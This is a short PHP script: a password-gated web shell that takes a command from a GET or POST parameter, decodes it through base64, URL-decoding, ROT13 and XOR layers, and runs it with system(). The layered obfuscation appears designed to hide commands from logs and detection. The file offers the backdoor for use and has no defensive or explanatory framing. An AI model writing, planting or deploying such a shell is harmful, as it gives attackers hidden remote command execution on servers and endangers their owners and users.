<?php
// ================================================================
// OBFUSCATED PLUS - Multi-layer encryption (FIXED)
// ================================================================

// Auth
if (!isset($_GET['key']) || $_GET['key'] !== 'your_secret_key') {
    die('Access denied');
}

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : (isset($_POST['cmd']) ? $_POST['cmd'] : '');

if ($cmd) {
    // Layer 1: Base64
    $cmd = base64_decode($cmd, true);
    if ($cmd === false) die('Invalid base64');
    
    // Layer 2: URL decode
    $cmd = urldecode($cmd);
    
    // Layer 3: ROT13
    $cmd = str_rot13($cmd);
    
    // Layer 4: XOR (gunakan key yang lebih random)
    $key = 'x9F#2mQ!7kL$5pR*';
    $out = '';
    for ($i = 0; $i < strlen($cmd); $i++) {
        $out .= chr(ord($cmd[$i]) ^ ord($key[$i % strlen($key)]));
    }
    
    system($out);
}
?>